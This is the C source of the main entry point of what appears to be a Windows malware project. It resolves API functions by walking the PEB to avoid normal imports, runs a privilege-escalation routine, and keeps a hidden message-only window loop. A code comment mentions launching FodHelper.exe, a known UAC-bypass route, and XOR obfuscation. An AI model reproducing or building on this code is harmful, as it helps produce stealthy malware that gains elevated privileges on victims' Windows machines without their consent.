#include "VxHeader.h"

/*
-Load kernel32.dll CreateProcessW for FodHelper.exe launch -done!
-fix Fodhelper.exe bug -done! (CreateProcessW not respecting parameter, not XOR'd atm)
*/

int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
{
	PPEB Peb = (PPEB)RtlGetPeb();
	PLDR_MODULE pLoadModule;
	API_TABLE Api;
	HWND cchWnd;
	MSG Message;
	INT nReturn;

	pLoadModule = (PLDR_MODULE)((PBYTE)Peb->LoaderData->InMemoryOrderModuleList.Flink->Flink - InMemoryOrderModuleListDelta);
	Api.PeBase = (DWORD64)pLoadModule->BaseAddress;
	Api.UserProcessInfo = (PRTL_USER_PROCESS_PARAMETERS)Peb->ProcessParameters;

	Api.RtlInitUnicodeString = (RTLINITUNICODESTRING)ImportFunction(Api.PeBase, pRtlInitUnicodeString);
	Api.LdrLoadDll = (LDRLOADDLL)ImportFunction(Api.PeBase, pLdrLoadDll);

	if (!Api.LdrLoadDll || !Api.RtlInitUnicodeString)
		goto FAILURE;

	if (!VxLoadNtDllFunctions(&Api))
		goto FAILURE;

	if (!VxLoadKernel32Functions(&Api))
		goto FAILURE;

	if (!VxLoadUser32Functions(&Api))
		goto FAILURE;

	VxGenerateFileNameTable(&Api);

	if (!VxDetermineTargetAndEscalation(&Api))
		goto FAILURE;

	if (!CreateCallbackEx(&Api, hInstance, &Api.FileNames))
		goto FAILURE;

	cchWnd = Api.vxCreateWindowEx(0, Api.FileNames.g_szClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hInstance, NULL);
	if (cchWnd == NULL)
		goto FAILURE;
	else
		Api.vxSendMessage(cchWnd, WM_PASS_STRUCTURE, (WPARAM)0, (LPARAM)&Api);

	while ((nReturn = Api.vxGetMessage(&Message, NULL, 0, 0)) != 0)
	{
		if (nReturn == -1)
			break;

		Api.TranslateMessage(&Message);
		Api.vxDispatchMessage(&Message);

	}
	
	return ERROR_SUCCESS;

FAILURE:

	Api.dwError = VxGetLastError();

	return (int)Api.dwError;
}
